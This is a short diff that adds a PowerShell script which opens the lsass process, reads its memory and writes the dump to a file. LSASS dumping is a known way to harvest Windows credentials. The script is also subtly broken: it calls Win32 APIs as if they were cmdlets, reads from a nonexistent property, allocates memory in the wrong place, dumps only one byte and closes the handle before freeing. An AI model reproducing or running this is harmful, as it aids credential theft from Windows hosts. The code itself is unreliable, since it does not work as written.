@@ -1,0 +1,15 @@
+$process = Get-Process lsass
+$procHandle = OpenProcess -ProcessId $process.Id -AccessType PROCESS_VM_READ -ErrorAction Stop
+
+
+$size = $process.VirtualMemorySize64
+$addr = VirtualAllocEx -ProcessHandle $procHandle -BaseAddress 0 -Size $size -AllocationType MEM_COMMIT -Protect PAGE_READWRITE
+
+ReadProcessMemory -ProcessHandle $procHandle -BaseAddress $process.PML4 -Buffer $addr -BufferSize $size -BytesRead ([ref] 0)
+
+
+$dump = [System.Runtime.InteropServices.Marshal]::ReadByte($addr, $size)
+Set-Content -Path "abcdefghi.txt" -Value $dump -Encoding Byte
+
+CloseHandle -Object $procHandle
+VirtualFreeEx -ProcessHandle $procHandle -BaseAddress $addr -Size $size -FreeType MEM_RELEASE
